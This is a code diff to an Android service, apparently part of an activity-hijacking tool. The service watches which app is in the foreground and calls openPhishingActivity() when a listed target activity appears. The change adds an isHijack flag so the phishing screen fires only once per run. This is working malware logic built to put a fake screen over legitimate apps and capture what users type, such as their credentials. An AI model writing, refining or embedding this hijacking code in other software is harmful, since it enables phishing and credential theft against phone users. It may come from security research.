@@ -39,6 +39,7 @@ public class MonitorService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId){
         super.onStartCommand(intent,flags,startId);
         times = intent.getIntExtra("time",0) + 2000;
+        final boolean[] isHijack = {false};
         mHandler = new Handler();
         mHandler.post(new Runnable() {
             @Override
@@ -47,7 +48,8 @@ public class MonitorService extends Service {
                 String fore = getForegroundClassName(getApplicationContext());
                 Log.i(TAG,"Name" + fore);
                 for(String targetActivityArray:targetActivityArrays){
-                    if(targetActivityArray.equals(fore)){
+                    if(targetActivityArray.equals(fore) && !isHijack[0]){
+                            isHijack[0] = true;
                             openPhishingActivity();
                     }
                 }
